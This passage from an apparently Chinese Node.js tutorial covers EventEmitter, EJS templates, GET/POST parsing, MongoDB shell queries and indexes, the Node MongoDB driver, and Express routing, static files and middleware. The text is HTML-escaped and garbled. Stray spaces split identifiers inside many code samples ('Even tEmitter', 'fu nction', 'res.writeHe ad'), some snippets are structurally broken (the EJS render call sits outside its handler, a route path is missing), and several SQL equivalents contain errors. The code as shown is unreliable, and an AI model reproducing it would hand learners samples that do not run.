callback(result);    &#125;,    200);&#125;getData(function(data) &#123;    console.log(data);&#125;)\n\n7.3 Nodejs events 模块处理异步\nNode.js 有多个内置的事件，我们可以通过引入 events 模块，并通过实例化 EventEmitter 类来绑定和监听事件。\n\n// 引入 events 模块var events = require(&#x27;events&#x27;);var Even tEmitter =new event s .EventEmitter() ; /*实例化事件对象*/EventEmitter.on(&#x27;toparent&#x27;,function()&#123; console.log(&#x27;接收到了广播事件&#x27;);&#125;)setTimeout(function ()&#123;    console.log(&#x27;广播&#x27;);    EventEmitter.emit(&#x27;toparent&#x27; ); /*发送广播*/ &#125;,1000)\n\n八、静态文件托管 GET POST路由EJS模板引擎8.1 路由\n路由指的就是针对不同请求的 URL，处理不同的业务逻辑。\n\n\n8.2 初识 EJS 模块引擎\n我们学的 EJS 是后台模板，可以把我们数据库和文件读取的数据显示到 Html 页面上面。它 是一个第三方模块，需要通过 npm 安装\n\nnpm install ejs –save / cnpm install ejs --save\n\n\nNodejs 中使用:\n\nejs.renderFile(filename, data, options, function(err, str)&#123;// str =&gt; Rendered HTML string&#125;);\n\nEJS 常用标签\n\n&lt;%%&gt;流程控制标签\n&lt;%=%&gt;输出标签(原文输出HTML标签)\n&lt;%-%&gt;输出标签(HTML会被浏览器解析)\n\n&lt;a href=&quot;&lt;%= url %&gt;&quot;&gt;&lt;img src=&quot;&lt;%= imageURL %&gt;&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;ul&gt;&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt;  &lt;ul&gt;    &amp;lt;% for(var i = 0 ; i &amp;lt; news.length ; i++)&#123; %&amp;gt;    &lt;li&gt;&amp;lt;%= news[i] %&amp;gt;&lt;/li&gt; &amp;lt;% &#125; %&amp;gt;   &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt;\n\n8.3 Get、Post\n超文本传输协议(HTTP)的设计目的是保证客户端机器与服务器之间的通信\n在客户端和服务器之间进行请求-响应时，两种最常被用到的方法是:GET 和 POST\nGET - 从指定的资源请求数据。(一般用于获取数据)\nPOST - 向指定的资源提交要被处理的数据。(一般用于提交数据)\n\n\n\n获取 GET 传值:\nvar urlinfo=url.parse(req.url,true); urlinfo.query();\n\n获取 POST 传值:\nvar postData = &#x27;&#x27;; // 数据块接收中req.on(&#x27;data&#x27;,function(postDataChunk) &#123;    postData += postDataChunk;&#125;);// 数据接收完毕，执行回调函数req.on(&#x27;end&#x27;,function() &#123;    try &#123;        postData = JSON.parse(postData);    &#125; catch(e) &#123;&#125;    req.query = postData;    console.log(q uerystring.parse(postData));&#125;);\n\n九、MongoDb 数据库介绍、安装、使用9.1 数据库和文件的主要区别\n数据库有数据库表、行和列的概念，让我们存储操作数据更方便\n数据库提供了非常方便的接口，可以让 nodejs、php java .net 很方便的实现增加修改删除功能\n\n9.2 NoSql 介绍9.2.1 NoSQL 介绍\n由于互联网的迅速发展，云计算与 Web2.0。这样大量的交互给数据库提出了更高的性能要求，传统的数据库(本文泛指 SQL 数据库)，即关系数据库虽然具备良好的事物管理，但在 处理大量数据 的应用 时很难 在性能 上满足 设计要 求。NoSQL 就是主要为了解决当下大量高并发高要求的数据 库应用 需求，关系数 据库 具有严 格的参 照性，一致性 ，可用 性，原子性 ，隔离 性等特 点\n因此会产生一些例如表连接等操作，这样会大大降低系统的性能。而在当前很多应用场景下对性能的要求 远远强 于传统 数据库 关注的 点，NoSQL就是为了解决大规模数据与多样数 据种类 等问题，尤其是其中大数据的相关问题。\nNoSQL(NoSQL = Not Only SQL )，意即“不仅仅是 SQL”，它指的是非关系型的数据库，是以 key-value形式存储，和传统的关系型数据库不一样，不一定遵循传统数据库的一些基本要求，比如说遵循SQL 标准ACID 属性、表结构等等。NoSQL 最早被提出是在 20 世纪 80 年代，在当时更多是强调的是与关系数据库区 别对待 ，最近这些年被提及的更多是强调协助解决大数据等相关问题。NoSQL 在大数据时代有自己的意义\n\n9.2.2 NoSQL 应用情况介绍\n国内的互联网蓬勃发展，不仅涌现出 BAT(百度，阿里巴巴，腾讯)之类的巨头，也带动了整个互联 网行业的发展，大量的创业型公司如春笋般的涌出，在国家层面也提出了“互联网+”和“万众创业”的口 号。更多传统的行业也开始拥抱互联网。但是无论是做所谓的生态平台还是 传统业务的转型，涉及到的业务是多种多样的。这个时候企业架构师对于应用系统的核心——数据库管理 不仅有传统的 SQL 选项也有了 NoSQL这种适合特定场景需求的选项\n\nNoSQL 数据库在以下的这几种情况下比较适用\n\n数据模型比较简单\n需要灵活性更强的 IT 系统\n对数据库性能要求较高\n不需要高度的数据一致性\n对于给定 key，比较容易映射复杂值的环境\n\nNoSQL 发展现状\n\n国外: Google 的 BigTable 和 Amazon 的 Dynamo 使用的就是 NoSQL 型数据库。\n国内:百度、阿里、腾讯、新浪微博、视觉中国、优酷运营数据分析、飞信空间、豆瓣社区等\n\n9.3 什么时候建议使用 NoSql\n对数据库高并发读写的需求\n对海量数据的高效率存储和访问的需求\n对数据库的高可扩展性和高可用性的需求\n\n9.4 NoSql 和传统数据库简单对比\n非结构型数据库。没有行、列的概念。用 JSON 来存储数据。\n集合就相当于“表 ”，文档就相当于“行”。\n\n\n9.5 NoSql 种类\n9.6 MongoDb 介绍\nMongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像 关系数据库的。他支持的数据结构非常松散，是类似 json 的 bson 格式，因此可以存储比较复杂的数据类 型。Mongo 最大的特点是他支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以 实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。它的特点是高 性能 、易部署 、 易使用 ，存储数据非常 方便\n\n9.7 MongoDb 安装\n官网:https://www.mongodb.com/\n手册:https://docs.mongodb.org/manual/\n\n1. 双击 MongoDB 软件下一步下一步安装\n\n2. 安装完成配置环境变量 C:\\Program Files\\MongoDB\\Server\\3.0\\bin 加入到系统的path 环境变量中\n3. 打开 cmd 输入 :mongo命令看看是否成功。如果出来下图说明 mongodb配置成功。\n\n9.8 使用 MongoDb\n新建一个存放数据库的文件夹，注意:不能有中文和空格，建议不要放在 C 盘\n启动 MongoDb 服务\n\n\n服务端:mongod 开启数据库服务 mongod --dbpath C:\\mongodb\n\n开启 MongoDb 服务命令:\n\n\n--dbpath 就是选择数据库文档所在的文件夹\n也就是说，mongoDB 中，真的有物理文件，对应一个个数据库。U 盘可以拷走。\n注意:一定要保持，开机这个 CMD 不能动了，不能关，不能 ctrl+c。 一旦这个 cmd 有问题了，数据库就自动关闭了\n\n\n客户端输入 mongo 命令连接服务端\n\n\n客户端:mongo 使用数据库\n\n\n\n客户端:mongo 使用数据库 ip 地址:端口号\n\n\n十、MongoDB 数据库创建删除、表（集合）创建删除、数据增删改查10.1 数据库使用\n开启 mongodb 服务:要管理数据库，必须先开启服务，开启服务使用 mongod --dbpath c:\\mongodb\n\n\n\n管理 mongodb 数据库:mongo (一定要在新的 cmd 中输入)\n\n\n\n查看所有数据库列 表\n\nshow dbs\n\n10.2 创建数据库\n使用数据库、创建 数据库\nuse student\n\n\n如果真的想把这个数据库创建成功，那么必须插入一个数据\n数据库中不能直接插入数据，只能往集合(collectio ns)中插入数 据。不需要专门创建集合，只需要写点语法插入数据就会创建集合:\n\ndb.student.insert(&#123;“name”:”x iaom ing”&#125;);\n\n\ndb.student 系统发现 student 是一个陌生的集合名字，所以就自动创建了集合\n\n显示当前的数据集合(mysql 中叫表)\nshow collections\n\n删除数据库，删除当前所在的数据库\ndb.dropDatabase();\n\n删除集合，删除指定的集合删除表\n\n删除集合\n\ndb.COLLECTION_NAME.drop()db.user.drop()\n\n10.3 插入(增加)数据\n插入数据，随着数据的插入，数据库创建成功了，集合也创建成功了。\n\ndb.表名.insert(&#123;&quot;name&quot;:&quot;zhangsan&quot;&#125;);student 集合名称(表)\n\n10.4 查找数据1. 查询所有记 录\ndb.userInfo.find();\n\n\n相当于:select* from userInfo;\n\n2. 查询去掉后 的当前聚集集合中的某列的重复数据\ndb.userInfo.distinct(&quot;name&quot;);\n\n\n会过滤掉 name 中的相同数据\n相当于:select distict name from userInfo;\n\n3. 查询 age &#x3D; 22 的记录\ndb.userInfo.find(&#123;&quot;age&quot;: 22&#125;);\n\n\n相当于: select * from userInfo where age = 22;\n\n4. 查询 age &gt; 22 的记录\ndb.userInfo.find(&#123;age: &#123;$gt: 22&#125;&#125;);\n\n\n相当于:select * from userInfo where age &gt;22;\n\n5. 查询 age &lt; 22 的记录\ndb.userInfo.find(&#123;age: &#123;$lt: 22&#125;&#125;);\n\n\n相当于:select * from userInfo where age &lt;22;\n\n6. 查询 age &gt;&#x3D; 25 的记录\ndb.userInfo.find(&#123;age: &#123;$gte: 25&#125;&#125;);\n\n\n相当于:select * from userInfo where age &gt;= 25;\n\n7. 查询 age &lt;&#x3D; 25 的记录\ndb.userInfo.find(&#123;age: &#123;$lte: 25&#125;&#125;);\n\n8. 查询 age &gt;&#x3D; 23 并且 age &lt;&#x3D; 26\ndb.userInfo.find(&#123;age: &#123;$gte: 23, $lte: 26&#125;&#125;);\n\n9. 查询name中包含 mongo的数据,模糊查询用于搜索\ndb.userInfo.find(&#123;name: /mongo/&#125;);//相当于%%select * from userInfo where name like ‘%mongo%’;\n\n10. 查询 name 中以 mongo 开头的\ndb.userInfo.find(&#123;name: /^mongo/&#125;);\n\n\nselect * from userInfo where name like ‘mongo%’;\n\n11. 查询指定列 name、age 数据\ndb.userInfo.find(&#123;&#125;, &#123;name: 1, age: 1&#125;);\n\n\n相当于:select name, age from userInfo;\n\n\n当然 name 也可以用 true 或 false,当用 ture 的情况下河 name:1 效果一样，如果用 false 就 是排除 name，显示 name 以外的列信息\n\n12. 查询指定列 name、age 数据, age &gt; 25\ndb.userInfo.find(&#123;age: &#123;$gt: 25&#125;&#125;, &#123;name: 1, age: 1&#125;);\n\n\n相当于:select name, age from userInfo where age &gt;25;\n\n13. 按照年龄排序 1 升序 -1 降序\n\n升序:db.userInfo.find().sort(&#123;age: 1&#125;);\n降序:db.userInfo.find().sort(&#123;age: -1&#125;);\n\n14. 查询 name &#x3D; zhangsan, age &#x3D; 22 的数据\ndb.userInfo.find(&#123;name: &#x27;zhangsan&#x27;, age: 22&#125;);\n\n\n相当于:select * from userInfo where name = ‘zhangsan’ and age = ‘22’;\n\n15. 查询前 5 条数据\ndb.userInfo.find().limit(5 );\n\n\n相当于:selecttop 5 * from userInfo;\n\n16. 查询 10 条以后的数据\ndb.userInfo.find().skip(10);// 相当于:select * from userInfo where id not in (     selecttop 10 * from userInfo);\n\n17. 查询在 5-10 之间的数据\ndb.userInfo.find().limit (10).skip(5);\n\n\n可用于分页，limit 是 pageSize，skip 是第几页*pageSize\n\n18. or与 查询\ndb.userInfo.find(&#123;$or: [&#123;age: 22&#125;, &#123;age: 25&#125;]&#125;);\n\n\n相当于:select * from userInfo where age = 22 or age = 25;\n\n19. findOne 查询第一条数据\ndb.userInfo.findOne( );\n\n\n相当于:selecttop 1 * from userInfo;\n\ndb.userInfo.find().limit(1 );\n\n20. 查询某 个结果集的记录条数 统计数量\ndb.userInfo.find(&#123;age: &#123;$gte: 25&#125;&#125;).count();\n\n\n相当于:select count(*) from userInfo where age &gt;= 20;\n\n\n如果要返回限制之后的记录数量，要使用 count(true)或者 count(非 0)\n\ndb.users.find().skip(1 0).limit(5).count(true);\n\n10.5 修改数据\n修改里面还有查询条件。你要该谁，要告诉 mongo\n\n查找名字叫做小明的，把年龄更改为 16 岁\ndb.student.update(&#123;&quot;name&quot;:&quot;小明&quot;&#125;,&#123;$set:&#123;&quot;ag e&quot;:16&#125;&#125;);\n\n查找数学成绩是 70，把年龄更改为 33 岁:\ndb.student.update(&#123;&quot;sc ore.shuxue&quot;:70&#125;,&#123;$set:&#123;&quot;ag e&quot;:33&#125;&#125;);\n\n更改所有匹配项目\ndb.student.update(&#123;&quot;sex&quot;:&quot;男&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:33&#125;&#125;,&#123;multi: true&#125;);\n\n完整替换，不出现$set 关键字了: 注意\ndb.student.update(&#123;&quot;name&quot;:&quot;小明&quot;&#125;,&#123;&quot;name&quot;:&quot;大明&quot;,&quot;age&quot;:16&#125;);\n\n\ndb.users.update(&#123;name: &#x27;Lisi&#x27;&#125;, &#123;$inc: &#123;age: 50&#125;&#125;, false, true);` 相当于:`update users set age = age + 50 where name = ‘Lisi’;\n\n\ndb.users.update(&#123;name: &#x27;Lisi&#x27;&#125;, &#123;$inc: &#123;age: 50&#125;, $set: &#123;name: &#x27;hoho&#x27;&#125;&#125;, false, true);` 相当于: `update users set age = age + 50, name = ‘hoho’ where name = ‘Lisi’;\n\n10.6 删除数据db.collectionsNames.remove( &#123; &quot;borough&quot;: &quot;Manhattan&quot; &#125; )db.users.remove(&#123;age: 132&#125;);db.restaurants.remove( &#123; &quot;borough&quot;: &quot;Queens&quot; &#125;, &#123; justOne: true &#125; )\n\n十一、MongoDB 索引 explain 分析查询速度11.1 索引基础\n索引是对数据库表中一列或多列的值进行排序的一种结构，可以让我们查询数据库变得 更快。MongoDB 的索引几乎与传统的关系型数据库一模一样，这其中也包括一些基本的查 询优化技巧。\n\n下面是创建索引的 命令\ndb.user.ensureIndex( &#123;&quot;username&quot;:1&#125;)\n\n获取当前集合的索 引\ndb.user.getIndexes()\n\n删除索引的命令是\ndb.user.dropIndex( &#123;&quot;username&quot;:1&#125;)\n\n\n在 MongoDB 中，我们同样可以创建复合索引，如:\n数字 1 表示 username 键的索引按升序存储，-1 表示 age 键的索引按照降序方式存储\n\ndb.user.ensureIndex(&#123;&quot;username&quot;:1, &quot;age&quot;:-1&#125;)\n\n\n该索引被创建后，基于 username 和 age 的查询将会用到该索引，或者是基于 username 的查询也会用到该索引，但是只是基于 age 的查询将不会用到该复合索引。因此可以说，如果想用到复合索引，必须在查询条件中包含复合索引中的前 N个索引列。然而如果查询条件中的键值顺序和复合索引中的创建顺序不一致的话，MongoDB 可以智能的帮助我们调整该顺序，以便使复合索引可以为查询所用。如:\n\ndb.user.find(&#123;&quot;age&quot;: 30, &quot;username&quot;: &quot;stephen&quot;&#125;)\n\n\n对于上面示例中的查询条件，MongoDB 在检索之前将会动态的调整查询条件文档的顺 序，以使该查询可以用到刚刚创建的复合索引。\n\n\n对于上面创建的索引，MongoDB 都会根据索引的 keyname 和索引方向为新创建的索引自动分配一个索引名，下面的命令可以在创建索引时为其指定索引名，如:\n\ndb.user.ensureIndex( &#123;&quot;username&quot;:1&#125;,&#123;&quot;name&quot;:&quot;userindex&quot;&#125;)\n\n\n随着集合的增长，需要针对查询中大量的排序做索引。如果没有对索引的键调用 sort， MongoDB 需要将所有数据提取到内存并排序。因此在做无索引排序时，如果数据量过大以 致无法在内存中进行排序，此时 MongoDB 将会报错\n\n11.2 唯一索引\n在缺省情况下创建的索引均不是唯一索引。下面的示例将创建唯一索引，如\n\ndb.user.ensureIndex( &#123;&quot;useri d&quot;:1&#125;,&#123;&quot;uniq ue&quot;:true&#125;)\n\n\n如果再次插入 userid 重复的文档时，MongoDB 将报错，以提示插入重复键，如:\n\ndb.user.insert(&#123;&quot;userid&quot;:5&#125;) db.user.insert(&#123;&quot;userid&quot;:5&#125;)// E11000 duplicate key error index: user.user.$userid_1 dup key: &#123; : 5.0 &#125;\n\n\n如果插入的文档中不包含 userid 键，那么该文档中该键的值为 null，如果多次插入类似 的文档，MongoDB 将会报出同样的错误，如:\n\ndb.user.insert(&#123;&quot;userid1&quot;:5&#125;) db.user.insert(&#123;&quot;userid1&quot;:5&#125;)// E11000 duplicate key error index: user.user.$userid_1 dup key: &#123; : null &#125;\n\n\n如果在创建唯一索引时已经存在了重复项，我们可以通过下面的命令帮助我们在创建唯 一索引时消除重复文档，仅保留发现的第一个文档，如:\n\n先删除刚刚创建的唯一索引\ndb.user.dropIndex( &#123;&quot; userid&quot; :1&#125; )\n\n插入测试数据，以保证集合中有重复键存在。\ndb.user.remove() db.user.insert(&#123;&quot;userid&quot;:5&#125;)db.user.insert(&#123;&quot;userid&quot;:5&#125;)\n\n重新创建唯一索引\ndb.user.ensureIndex(&#123;&quot;userid&quot;:1&#125;,&#123;&quot;unique&quot;:true &#125;)\n\n我们同样可以创建 复合唯一索引，即保证复合键值唯一 即可。如:\ndb.user.ensureIndex( &#123;&quot;useri d&quot;:1,&quot;age&quot;:1&#125;,&#123;&quot;unique&quot;:true&#125;)\n\n11.3 索引的一些参数\n\n如果在为已有数据的文档创建索引时，可以执行下面的命令，以使 MongoDB 在后台创 建索引，这样的创建时就不会阻塞其他操作。但是相比而言，以阻 塞方式创建索引，会使整 个创建过程效率更高，但是在创建时 MongoDB 将无法接收其他的操作\n\ndb.user.ensureIndex( &#123;&quot;username&quot;:1&#125;,&#123;&quot;backgroun d&quot;:true&#125;)\n\n11.4 使用 explain\nexplain 是非常有用的工具，会帮助你获得查询方面诸多有用的信息。只要对游标调用 该方法，就可以得到查询细节。explain 会返回一个文档，而不是游标本身。如\n\n\n\nexplain 会返回查询使用的索引情况，耗时和扫描文档数的统计信息\n\n11.5 explain executionStats 查询具体的执行 时间db.tablename.find().explain( &quot;executionStats&quot; )\n\n\n关注输出的如下数值:explain.executionStats.executionTimeMillis\n\n十二、nodejs操作mongodb3.x数据库的方法//http://mongodb.github.io/node-mongodb-native/3.0/quick-start/quick-start//*nodejs操作mongodb数据库 1.安装mongodb、    cnpm install mongodb --save 2.引入mongodb下面的MongoClient    var MongoClient = require(&#x27;mongodb&#x27;).MongoClient; 3.定义数据库连接的地址 以及配置数据库    qianfeng数据库的名称    var url = &#x27;mongodb://localhost:27017/&#x27;;    var dbName = &#x27;shop&#x27; 4.nodejs连接数据库 MongoClient.connect(url,function(err,client)&#123;        const db = client.db(dbName);  数据库db对象 &#125;)5.操作数据库    \t MongoClient.connect(url,function(err,client)&#123;\t\t\tconst db = client.db(dbName);  数据库db对象\t\t\tMongoClient.connect(url,function(err,db)&#123;\t\t\t\tdb.collection(&#x27;user&#x27;).insertOne(&#123;&quot;name&quot;:&quot;张三&quot;&#125;,function(err,result)&#123;\t\t\t\t\tdb.close() //关闭连接\t\t\t\t&#125;)\t\t     &#125;)\t &#125;)     */var MongoClient = require(&#x27;mongodb&#x27;).MongoClient;//定义连接数据库的地址const  url = &#x27;mongodb://localhost:27017/&#x27;;var dbName = &#x27;shop&#x27;//连接数据库MongoClient.connect(url,(err,client)=&gt;&#123;    if(err)&#123;        console.log(&#x27;数据连接失败&#x27;);        return false;    &#125;    let db=client.db(dbName);   /*获取db对象*/    db.collection(&quot;admin&quot;).insertOne(&#123;&quot;name&quot;:&quot;mongodb3.0&quot;,&quot;age&quot;:10&#125;,function(err)&#123;        if(err)&#123;            console.log(&#x27;增加失败&#x27;);            return false;        &#125;        console.log(&#x27;增加成功&#x27;);        client.close();  /*关闭数据库*/    &#125;)&#125;)\n\n十三、NodeJs操作MongoDb数据库 数据的增加 修改 删除13.1 在 Nodejs 中使用 Mongodb\n前面的课程我们讲了用命令操作 MongoDB，这里我们看下如何用 nodejs 来操作数据库\n\n需要引包\nnpm install mongodb --save-dev / cnpm install mongodb --save-dev\n\n13.2 Nodejs 连接 MongoDb 数据库var express = require(&quot;express&quot;); //数据库引用var MongoClient = require(&#x27;mongodb&#x27;).MongoClient;var app = express();//数据库连接的地址，最后的斜杠表示数据库名字var shujukuURL = &#x27;mongodb://localhost:27017/news&#x27;;app.get(&quot;/&quot;, fu nction(req, res) &#123; //连接数据库，这是一个异步的操作    MongoClient.connect(shujukuURL,    function(err, db) &#123;        res.writeHe ad(200, &#123;            &quot;Content-Type&quot;: &quot; text/html;charset =UTF8&quot;        &#125;);        if (err) &#123;            res.send(&quot;数据库连接失 败&quot;);            return;        &#125;        res.write(&quot;恭喜，数据库已经成功连接 \\n&quot;);        db.collection(&quot;user&quot;).insertOne(&#123;            &quot;name&quot;: &quot;哈哈&quot;        &#125;,        functio n(err, result) &#123;            if (err) &#123;                res.send(&quot;数据库写入 失败&quot;);                return;            &#125;            res.write(&quot;恭喜，数据 已经成功插入&quot;);            res.end();            //关闭数据库            db.close();        &#125;);    &#125;);&#125;);app.listen(8020);\n\n13.3 Nodejs 查找 MongoDb 数据库集合MongoClient.connect(dbUrl,function(err, db) &#123;    if (err) &#123;        /*数据库连接失败*/        console.log(&#x27;数据库连接失败&#x27;);        return;    &#125;    var result = [];    var userRel = db.collection(&#x27;user&#x27;).find();    //res.send(userRel);    userRel.each(function(err, doc) &#123;        if (err) &#123;            res.write(&quot;游标遍历错 误&quot;);            return;        &#125;        if (doc != null) &#123;            result.push(doc);        &#125; else &#123;            console.log(result); //遍历完毕            db.close();            res.render(&quot;index&quot;, &#123;                &quot;result&quot;: result            &#125;);        &#125;    &#125;);&#125;)\n\n13.4 Nodejs 给 MongoDb 增加数据MongoClient.connect(dbUrl,function(err, db) &#123;    if (err) &#123;        return    &#125;    db.collection(&#x27;user&#x27;).insertOne(&#123;        &quot;name&quot;: name,        &quot;age&quot;: age,        &quot;score&quot;: &#123;            &quot;shuxue&quot;: shuxuechengji,            &quot;yuwen&quot;: yuwenchengji        &#125;    &#125;,    function(err, result) &#123;        if (err) &#123;            console.log(&#x27;写入数据失败&#x27;);        &#125;        //关闭数据库        db.close();        //res.redirect(&#x27;/add&#x27;); res.redirect(&#x27;/&#x27; ); /*路由跳转*/ res.end(); ////res.location(&#x27;/add&#x27;)    &#125;)&#125;)\n\n13.5 Nodejs 修改 MongoDb 数据MongoClient.connect(dbUrl,function(err, db) &#123;    if (err) &#123;        console.log(&#x27;数据库连接错误&#x27;);        return;    &#125;    db.collection(&#x27;user&#x27;).updateOne(&#123;        &quot;_id&quot;: ObjectID(id)    &#125;,    &#123;        &quot;name&quot;: name,        &quot;age&quot;: age,        &quot;score&quot;: &#123;            &quot;shuxue&quot;: shuxue,            &quot;yuwen&quot;: yuwen        &#125;    &#125;,    function(err, results) &#123;        console.log(results);        db.close();        res.redirect(&#x27;/&#x27;);        /*路由跳转*/        res.end(&#x27;end&#x27;);    &#125;)&#125;)\n\n13.6 Nodejs 删除 MongoDb 数据MongoClient.connect(dbUrl,function(err, db) &#123;    if (err) &#123;        throw new Error(&quot;数据库连接失败&quot;);        return;    &#125;    db.collection(&#x27;user&#x27;).deleteOne(&#123;        &quot;_id&quot;: ObjectID(id)    &#125;,    func tion(error, result) &#123;        if (error) &#123;            throw new Error(&#x27;删除数据失败&#x27;);            return;        &#125;        db.close();        res.redirect(&#x27;/&#x27;);        /*路由跳转*/    &#125;)&#125;)\n\n十四、Express 安装和使用14.1 Express 简单介绍\nExpress 是一个基于 Node.js 平台，快速、开放、极简的 web 开发框架\nExpress 框架是后台的 Node 框架，所以和 jQuery、zepto、yui、bootstrap 都不一个东西。 Express 在后台的受欢迎的程度类似前端的 jQuery，就是企业的事实上的标准。\n\nExpress 特点\n\nExpress 是一个基于 Node.js 平台的极简、灵活的 web 应用开发框架，它提供一系列强大的特性，帮助你创建各种 Web 和移动设备应用\n丰富的 HTTP 快捷方法和任意排列组合的 Connect 中间件，让你创建健壮、友好的 API 变得既快速又简单\nExpress 不对 Node.js 已有的特性进行二次抽象，我们只是在它之上扩展了 Web应用所需的基本功能\n\n14.2 Express 安装使用安装:\n\n安装 Express 框架，就是使用 npm 的命令\n\nnpm install express --save\n\n\n--save 参数，表示自动修改 package.json 文件，自动添加依赖项\n\n简单使用\nnpm install express–save //1.引入var express = require(&#x27;express&#x27;);var app = express();//2.配置路由app.get(&#x27;/&#x27;,function(req, res) &#123;    res.send(&#x27;Hello World!&#x27;);&#125;); //3.监听端口app.listen(3000,&#x27;127.0.0.1&#x27;);\n\n完整 Demo\nvar express = require(&#x27;express&#x27;);/*引入 express*/var app = newexpress();/*实例化express 赋值给app*///配置路由 匹配 URl 地址实现不同的功能app.get(&#x27;/&#x27;,function(req, res) &#123;    res.send(&#x27;首页&#x27;);&#125;) app.get(&#x27;/search&#x27;,function(req, res) &#123;    res.send(&#x27;搜索&#x27;); //?keyword=华为手机&amp;enc=utf-8&amp;suggest=1.his.0.0&amp;wq&#125;) app.get(&#x27;/login&#x27;,function(req, res) &#123;    res.send(&#x27;登录&#x27;);&#125;) app.get(&#x27;/register&#x27;,function(req, res) &#123;    res.send(&#x27;注册&#x27;);&#125;) app.listen(3000, &quot;127.0.0.1&quot;);\n\n14.3 Express 框架中的路由\n路由(Routing)是由一个 URI(或者叫路径)和一个特定的 HTTP 方法(GET、POST 等) 组成的，涉及到应用如何响应客户端对某个网站节点的访问\n\n简单的路由配置\n\n当用 get 请求访问一个网址的时候，做什么事情\n\napp.get(&quot;网址&quot;,function(req,res)&#123;&#125;);\n\n\n当用 post 访问一个网址的时候，做什么事情:\n\napp.post(&quot;网址&quot;,function(req,res)&#123;&#125;);// user 节点接受 PUT 请求app.put(&#x27;/user&#x27;, function (req, res) &#123;    res.send(&#x27;Got a PUT request at /user&#x27;); &#125;);// user 节点接受 DELETE 请求app.delete(&#x27;/user&#x27;, function (req, res) &#123;    res.send(&#x27;Got a DELETE request at /user&#x27;); &#125;);\n\n动态路由配置:\napp.get( ,function(req,res)&#123;     var id = req.params[&quot;id&quot;];    res.send(id); &#125;);\n\n路由的正则匹配:(了解)\napp.get(&#x27;/ab*cd&#x27;, function(req, res) &#123;     res.send(&#x27;ab*cd&#x27;);&#125;);\n\n路由里面获取 Get 传值\n// /news?id=2&amp;sex=nanapp.get(&#x27;/news, function(req, res) &#123;     console.log(req.query);&#125;);\n\n14.4 Express 框架中 ejs 的安装使用Express 中 ejs 的安装:\nnpm install ejs --save // 或者:npm install ejs --save-dev\n\nExpress 中 ejs 的使用\nvar express = require(&quot;express&quot;);var app = express();app.set(&quot;view engine&quot;, &quot;ejs&quot;);app.get(&quot;/&quot;,    function(req, res) &#123;&#125;);        res.render(&quot;news&quot;, &#123;            &quot;news&quot;: [&quot;我是小新闻啊&quot;, &quot;我也是啊&quot;, &quot;哈哈哈哈&quot;]&#125;);app.listen(3000);\n\n指定模板位置 ，默认模板位置在 views\napp.set(&#x27;views&#x27;, __dirname + &#x27;/views&#x27;);\n\nEjs 引入模板\n&lt;%- include header.ejs %&gt;\n\nEjs 绑定数据\n&lt;%=h%&gt;\n\nEjs 绑定 html 数据\n&lt;%-h%&gt;\n\nEjs 模板判断语句\n&lt;% if(true)&#123; %&gt;     &lt;div&gt;true&lt;/div&gt;    &lt;%&#125;   else&#123; %&gt;     &lt;div&gt;false&lt; /di v&gt;&lt;%&#125; %&gt;\n\nEjs 模板中循环数据\n&lt;%for(var i=0;i&lt;list.length;i++) &#123; %&gt;    &lt;li&gt;&lt;%=list[i] %&gt;&lt;/li&gt;&lt;%&#125;%&gt;\n\nEjs 后缀修改为 Html\n\n这是一个小技巧，看着.ejs 的后缀总觉得不爽，使用如下方法，可以将模板文件的后缀换成我们习惯的.html\n\n\n在 app.js 的头上定义 ejs:,代码如下:\n\nvar ejs = require(&#x27;ejs&#x27;);\n\n\n注册 html 模板引擎代码如下:\n\napp.engine(&#x27;html&#x27;,ejs.__express);\n\n\n将模板引擎换成 html代码如下:\n\napp.set(&#x27;view engine&#x27;, &#x27;html&#x27;);\n\n\n修改模板文件的后缀为 .html\n\n14.5 利用 Express.static 托管静态文件\n如果你的静态资源存放在多个目录下面，你可以多次调用 express.static 中间件:\n\napp.use(express.static(&#x27;public&#x27;));\n\n\n现在，public 目录下面的文件就可以访问了\n\nhttp://localhost:3000/images/kitten.jpghttp://localhost:3000/css/style.css http://localhost:3000/js/app.jshttp://localhost:3000/images/bg.png http://localhost:3000/hello.html\n\n\n如果你希望所有通过 express.static 访问的文件都存放在一个“虚拟(virtual)”目 录(即目录根本不存在)下面，可以通过为静态资源目录指定一个挂载路径的方式来实现，如下所示\n\napp.use(&#x27;/static&#x27;, express.static(&#x27;public&#x27;));\n\n\n现在，你就爱可以通过带有 “&#x2F;static” 前缀的地址来访问 public 目录下 面的文件了\n\nhttp://localhost:3000/static/images/kitten.jpghttp://localhost:3000/static/css/style.css http://localhost:3000/static/js/app.js http://localhost:3000/static/images/bg.pnghttp://localhost:3000/static/hello.html\n\n14.6 Express 中间件\nExpress 是一个自身功能极简，完全是由路由和中间件构成一个的 web 开发框架:从本质上来说，一个 Express 应用就是在调用各种中间件\n中间件(Middleware) 是一个函数，它可以访问请求对象(request object (req)), 响 应对象(response object (res)), 和 web 应用中处理请求-响应循环流程中的中间件，一般 被命名为 next 的变量\n\n中间件的功能包括\n\n执行任何代码\n修改请求和响应对象\n终结请求-响应循环\n调用堆栈中的下一个中间件\n\n\n如果我的 get、post 回调函数中，没有 next 参数，那么就匹配上第一个路由，就不会往下匹 配了。如果想往下匹配的话，那么需要写 next()\n\nExpress 应用可使用如下几种中间件\n\n应用级中间件\n路由级中间件\n错误处理中间件\n内置中间件\n第三方中间件\n\n\n应用级中间件\n\n\n\n路由中间件\n\n\n\n错误处理中间件\n\n\n\n内置中间件\n\n\n\n第三方中间件\n\n\n14.7 获取 Get Post 请求的参数\nGET 请求的参数在 URL 中，在原生 Node 中，需要使用 url 模块来识别参数字符串。在Express 中，不需要使用 url 模块了。可以直接使用 req.query 对象\nPOST 请求在 express 中不能直接获得，可以使用 body-parser 模块。使用后，将可以用req.body得到参数。但是如果表单中含有文件上传，那么还是需要使用 formidable 模块\n\n1. 安装\nnpm install body-parser\n\n2. 使用 req.body 获取 post 过来的参数\nvar express = require(&#x27;express&#x27;) var bodyParser = require(&#x27;body-parser&#x27;) var app = express()// parse application/x-www-form-urlencodedapp.use(bodyParser.urlencoded(&#123;    extended: false&#125;))// parse application/jsonapp.use(bodyParser.json()) app.use(function(req, res) &#123;    res.setHeader(&#x27;Content-Type&#x27;, &#x27;text/plain&#x27;) 